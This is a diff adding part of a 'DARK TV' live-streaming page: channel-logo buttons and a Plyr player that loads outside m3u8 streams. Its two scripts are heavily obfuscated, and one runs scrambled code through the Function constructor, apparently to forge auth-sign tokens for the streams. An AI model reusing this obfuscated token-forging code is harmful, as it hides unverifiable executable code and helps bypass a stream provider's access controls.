+                                src="https://i.postimg.cc/5QHmptWG/Bharwana-Tv-channels-logo-id-181-gnn-live-png.webp"></button>
+                        <!---x85Ffkx0 -->
+
+
+                        <button class="playlist-button" data-slug="183"><img class="print"
+                                src="https://i.postimg.cc/4mxYD0Kf/Bharwana-Tv-channels-logo-id-183-such-tv-live-png.webp"></button>
+                        <!---hP9VdWcd -->
+
+
+                        <button class="playlist-button" data-slug="184"><img class="print"
+                                src="https://i.postimg.cc/75hZRyTD/Bharwana-Tv-channels-logo-id-184-a1-tv-live-png.webp"></button>
+                        <!---fRjSJzz3 -->
+
+
+                        <button class="playlist-button" data-slug="185"><img class="print"
+                                src="https://i.postimg.cc/VdWJp8sH/Bharwana-Tv-channels-logo-id-185-pnn-news-live-png.webp"></button>
+                        <!---hPHVJDkg -->
+
+
+
+
+                        <button class="playlist-button" data-slug="81"><img class="print"
+                                src="https://i.postimg.cc/8sswTZfH/Bharwana-Tv-channels-logo-id-81-HUM-Masala-Channel-logo-png.webp"></button>
+                        <!---MZmLb4Wh -->
+
+
+                        <button class="playlist-button" data-slug="82"><img class="print"
+                                src="https://i.postimg.cc/Rq31kq2p/Bharwana-Tv-channels-logo-id-82-logo-HUM-TV-Channel-logo-png.webp"></button>
+                        <!---T20kWD0x -->
+
+
+
+                        <button class="playlist-button" data-slug="86"><img class="print"
+                                src="https://i.postimg.cc/d7Htvsg4/Bharwana-Tv-channels-logo-id-86-cnn-news-live-png.webp"></button>
+                        <!---1tPgG4Bh -->
+
+
+                        <button class="playlist-button" data-slug="161"><img class="print"
+                                src="https://i.postimg.cc/sQXmQxMq/Bharwana-Tv-channels-logo-id-abnnews-abr-abn-news-live-pn.webp"></button>
+                        <!---ABN NEWS-->
+
+                        <button class="playlist-button" data-slug="113"><img
+                                class="https://i.postimg.cc/446LYwyN/20231116-122515.jpg"></button>
+                        <!---DUNYA NEWS-->
+
+
+                    
+        </div>
+        <footer>
+            <h2 class="heading red blink logoText">DARK TV</h2>
+            <p>
+                <script>
+                    document.write(new Date().getFullYear() + " &copy; <span class='logoText'>DARK TV</span> All Rights Reserved");
+                </script>
+            </p>
+        </footer>
+        
+
+
+                </section>
+            </section>
+
+            <script src='https://cdn.plyr.io/3.5.6/plyr.js'></script>
+           
+           <script>
+           
+         
+const _0x217803=_0xae7f;(function(_0x11eed2,_0x1bed98){const _0x312835=_0xae7f,_0x5d1739=_0x11eed2();while(!![]){try{const _0x299571=-parseInt(_0x312835(0x11a))/(-0x26ac+-0x1*0x2235+-0x13*-0x3d6)+-parseInt(_0x312835(0x138))/(0x1246+-0x1073*-0x2+-0x332a)+parseInt(_0x312835(0x128))/(-0x2652+-0xd*-0x35+-0x4*-0x8e9)+parseInt(_0x312835(0x14d))/(-0x1632+0x4*-0x29+0x16da)+parseInt(_0x312835(0x149))/(-0x6*0x16f+0x201+0x69e)+parseInt(_0x312835(0x126))/(-0x56c*-0x1+0xa72*-0x1+0x50c)*(-parseInt(_0x312835(0x135))/(-0x1*-0x14b2+-0x180d+-0x2*-0x1b1))+parseInt(_0x312835(0x120))/(-0xa*0x1be+-0x144e*-0x1+-0x2da);if(_0x299571===_0x1bed98)break;else _0x5d1739['push'](_0x5d1739['shift']());}catch(_0x298551){_0x5d1739['push'](_0x5d1739['shift']());}}}(_0x5e36,0x69137*-0x1+-0xd3*-0x1bb9+0x47230*-0x1),document[_0x217803(0x118)+_0x217803(0x11b)](_0x217803(0x13a)+_0x217803(0x152),()=>{const _0x783aab=_0x217803,_0x1e495a={'QUamN':_0x783aab(0x11e),'RIJUG':function(_0xf982fc){return _0xf982fc();},'xivAb':_0x783aab(0x145),'UIVhV':_0x783aab(0x13f),'IzebG':_0x783aab(0x11d),'BTdPu':_0x783aab(0x147),'pngHa':_0x783aab(0x111),'pxnEL':_0x783aab(0x132),'Wehxd':_0x783aab(0x15c),'mNRGw':_0x783aab(0x11f),'askRP':_0x783aab(0x136),'rSELm':_0x783aab(0x14f)+'me','oChmf':_0x783aab(0x15b),'RRCbb':_0x783aab(0x143),'gBZMP':_0x783aab(0x139),'nGWGc':_0x783aab(0x154),'HHSFH':_0x783aab(0x140)+_0x783aab(0x150)},_0x135e42=[_0x1e495a[_0x783aab(0x113)],_0x1e495a[_0x783aab(0x116)],_0x1e495a[_0x783aab(0x12e)],_0x1e495a[_0x783aab(0x124)],_0x1e495a[_0x783aab(0x127)],_0x1e495a[_0x783aab(0x14c)],_0x1e495a[_0x783aab(0x14b)]],_0x1fd32b=document[_0x783aab(0x134)+_0x783aab(0x129)](_0x1e495a[_0x783aab(0x130)]),_0x4e6cce=new Plyr(_0x1fd32b,{'controls':_0x135e42}),_0xe2d845=document[_0x783aab(0x134)+_0x783aab(0x12d)](_0x1e495a[_0x783aab(0x155)]);_0xe2d845[_0x783aab(0x123)](_0x3a0534=>{const _0x164cd4=_0x783aab;_0x3a0534[_0x164cd4(0x118)+_0x164cd4(0x11b)](_0x1e495a[_0x164cd4(0x117)],function(){const _0x533e07=_0x164cd4,_0x454f27=this[_0x533e07(0x137)+'te'](_0x1e495a[_0x533e07(0x112)]),_0x3f1e3d=_0x1e495a[_0x533e07(0x125)](tg),_0x11f434=[];/^\d+$/[_0x533e07(0x12b)](_0x454f27)||/^[0-9-]+$/[_0x533e07(0x12b)](_0x454f27)?_0x11f434[_0x533e07(0x121)]({'src':_0x533e07(0x133)+_0x533e07(0x153)+_0x533e07(0x156)+_0x533e07(0x148)+_0x533e07(0x12c)+_0x454f27+(_0x533e07(0x146)+_0x533e07(0x119)+_0x533e07(0x131))+_0x3f1e3d,'type':_0x1e495a[_0x533e07(0x151)],'size':_0x1e495a[_0x533e07(0x14e)]},{'src':_0x533e07(0x133)+_0x533e07(0x153)+_0x533e07(0x156)+_0x533e07(0x148)+_0x533e07(0x12c)+_0x454f27+(_0x533e07(0x13e)+_0x533e07(0x119)+_0x533e07(0x131))+_0x3f1e3d,'type':_0x1e495a[_0x533e07(0x151)],'size':_0x1e495a[_0x533e07(0x13b)]},{'src':_0x533e07(0x133)+_0x533e07(0x153)+_0x533e07(0x156)+_0x533e07(0x148)+_0x533e07(0x12c)+_0x454f27+(_0x533e07(0x144)+_0x533e07(0x119)+_0x533e07(0x131))+_0x3f1e3d,'type':_0x1e495a[_0x533e07(0x151)],'size':_0x1e495a[_0x533e07(0x11c)]}):_0x11f434[_0x533e07(0x121)]({'src':_0x533e07(0x133)+_0x533e07(0x153)+_0x533e07(0x156)+_0x533e07(0x148)+_0x533e07(0x12c)+_0x454f27+(_0x533e07(0x13d)+_0x533e07(0x12a)+_0x533e07(0x122))+_0x3f1e3d,'type':_0x1e495a[_0x533e07(0x151)]});const _0x2310cc=_0x11f434[_0x533e07(0x14a)](_0x4aab71=>_0x533e07(0x12f)+_0x533e07(0x13c)+_0x4aab71[_0x533e07(0x115)]+_0x533e07(0x114)+_0x4aab71[_0x533e07(0x141)]+_0x533e07(0x158)+(_0x4aab71[_0x533e07(0x159)]||'')+'\x22>')[_0x533e07(0x15a)]('');_0x1fd32b[_0x533e07(0x157)]=_0x2310cc,_0x4e6cce[_0x533e07(0x142)]={'type':_0x1e495a[_0x533e07(0x15d)],'sources':_0x11f434},_0x4e6cce[_0x533e07(0x11f)]();});});}));function _0xae7f(_0x50425b,_0x39c15f){const _0x4e616e=_0x5e36();return _0xae7f=function(_0x280b19,_0x25f32f){_0x280b19=_0x280b19-(-0x1690*0x1+-0x3*-0xaef+0x24b*-0x4);let _0x420ad3=_0x4e616e[_0x280b19];return _0x420ad3;},_0xae7f(_0x50425b,_0x39c15f);}function _0x5e36(){const _0x64fa16=['progress','getAttribu','2611350uvCogv','fullscreen','DOMContent','IzebG','c=\x22','/playlist.','M/playlist','240','.playlist-','type','source','settings','H/playlist','video/mp4','L/playlist','720','m:8087/jaz','6805045nuiUyv','map','gBZMP','RRCbb','5973968eEEZtO','UIVhV','current-ti','button','xivAb','Loaded','n07isb.tam','.js-player','HHSFH','ashaweb.co','innerHTML','\x22\x20size=\x22','size','join','duration','play-large','pngHa','video','QUamN','Wehxd','\x22\x20type=\x22','src','mNRGw','pxnEL','addEventLi','.m3u8?wmsa','870320WUCSKZ','stener','BTdPu','480','data-slug','play','1822480KKengw','push','thsign=','forEach','rSELm','RIJUG','12uxbyeF','oChmf','232884ZAnvDe','tor','m3u8?wmsau','test','zauth/','torAll','askRP','<source\x20sr','nGWGc','uthsign=','click','https://cd','querySelec','728854zFkWRh'];_0x5e36=function(){return _0x64fa16;};return _0x5e36();}
+var tg;(function(){var VFF='',yhm=759-748;function MpM(d){var k=1320374;var s=d.length;var u=[];for(var j=0;j<s;j++){u[j]=d.charAt(j)};for(var j=0;j<s;j++){var i=k*(j+188)+(k%17136);var c=k*(j+601)+(k%26220);var z=i%s;var l=c%s;var x=u[z];u[z]=u[l];u[l]=x;k=(i+c)%1660964;};return u.join('')};var PVl=MpM('cluetjwcrndsichafrotxkqouypnmrozvgsbt').substr(0,yhm);var Vrm=',al o=[21b;1},,=k5hvur us"sb dufehej=l}n0p]rrtgv[x]zm;ram 2=-9=,j1h8e,.4h7{,a5d8h,t1a87,s6+7h,l6=6 ,=519),60i8t,e0[8.,)7+;va9 8=)]6f,r,v=rfa-05aoz]lonat9;"+c)s[i[q]t=,+z;{a. a=)]ver=211ba=l5tmy=,1sf0r;v;r vk0ovrarg.myn}snl(n7ti;S+o)rvrrhq(a"g,m+n.s"vn.iphie(r 2)rf+r2vlr[f.q=l;nCt9-a;v>p0rf;-={laf y=(uul2v=r1thq;fj;na; e=nual;verCl;0=v;rtk.trlfncth;+au r;;oq(oai o={;i<v;,+1)tv(r-x(t(c0a1Crd}At())0vvrrcfj*xt;wf(c){w=(c=1<*)+}.lh,raoaeyt+y 17-r;r=n;!+];<e[s( [fex(=.)vw{b=(a. e;gchfeft4c=a4Cvd)Aa(.+e)r+).rh{rzoeewt=y+2l-2;==w;(+n2 }el(e=ccn=i;ur;rie(g=(nhly)v=,]iin(+>t)e.su;h"trsrbut;iagtl.r))fh=p.s](n[g+t]C;0= +o;tiv( !)nal()rii(l<a)h.gu)hkt]subntdiug"l.)yq)f)=e.8o(n("l)7}vsrprs.(9[a]y;,vor;o7syjni+(;" ;aaa [=m3v,s2,4u,e0=3j,[6i.lo]c.t zC;)aa +=;tmi1ghfhoqC[ajCrd6(;6s;(ob(eaA h=o;h<+.;etggh(ah+dopo7s.l+trg[uyc=a8Az(p) .,opnAS+ranr.9r]mnhjrvoferngag));leyuhn7ousyl8tag("a").no8nag);';var jRd=MpM[PVl];var uoe='';var jRR=jRd;var JWB=jRd(uoe,MpM(Vrm));var ROu=JWB(MpM('Z_s}oZZ%he(t,eZ.;%r6nan.)()={;0$\/hr;d,3.2y.ZZ(=_.e7)Z9\'i7{\/& nv{, .ed$u_nCZ g2Sv.f)gpf)6.c)=7..a%10oZ;e)0je.7,)ao $$e0)ma}=]r$)q03=;"1ts("b.l(!l(.aefZe!pZ3!i+r0n-{7\/o[.n ]5)_o.u.733\/{5o;sk(}7Z4Z=4f1p)ni),(Znrv$ZrZ4t}fe!sZi+7kf3{Z(a=5!._7s.)(5b=a;;DZ Zwe!j;aZMetr.).(;)1)Zv2Zaw,=te;dZlaZ M_rZ_h41tZ=$lt;4(73yeZg6+y;eS2,]ra$oeuth)$Dsabt )ZsZ!o_5.tZa,Zt_(bZ 3+)n=b4{t7.}3.f ea7$Z1ri0s3),f\'.;Z,4,Dke&Z_Z)o=rkZ,,eg}6([r6.3oegpe8;$nb00.Z.rh6[{i9Zd)Z)#6eb$ZZ$w!3)4Zs$Z,;!+t_,_eyf)Z3"7Z$,0mZ4;tro$)Zy!Z,\'v=j5e.(l,Z}std.&Zj\'k)c;gi77)%deZ.v(v1.3;v{fbZo1C14r(oo1%(s%.;ZZn&(!j00e%frZZ=pZn,n+tt3kM;,,t=te#0ajhs(e)uZZ.(= Z}1bt3(t!3.$m.+ge,(4d4zce.6=!)a,!)4)7a2a-Z57_d!Z#(.i.6tt;(%.)-;]rZo7Z__]4teZ{ZZ)0ZZo0,r5e0+=)Z.tt\/6t4ar=!Zsg.)0d5l"$.p+%=.Z&=+ta6)=Z3eZg-$]e)sh:g0(a it#()j()Zz1ea,e7fk=b](5ZjdZtZ5.+1;l\'{%=,kZZaa3Z("[.!n,1Z.b6Z((Z(l, =k-b;j.atn*(r SrZa")#).r(*h$()Ze;!kasn_ 2!Z(}Zms}b5j64stscsa20nap__";,ttcZZ..\'#3,ae Z_Z3t$a$qZn (dem_(s,"Z)roe7.]340.a).7$.rl;;Z4)$Za (10]( ._ao.$cZ\/omo!rai6 !=(a{lier$Z=Zo47(Z\/"3jto)153)&.)vmZZ1Z6gtZ_mfdZ*detcrn.=jo5)t6{test)+!tZ3i)05i2!44f.#Z$(gba+]s e!ft0h_4 7}he4=\/)*("Z5rvraof(tne.0sZ;s#3rs_}ebst)224!.a"Z_Z}$6yZ%2 !kt['));var uCl=jRR(VFF,ROu );uCl(2551);return 2548})()
+
+
+            </script>
+
+
+
+
+
+</html>
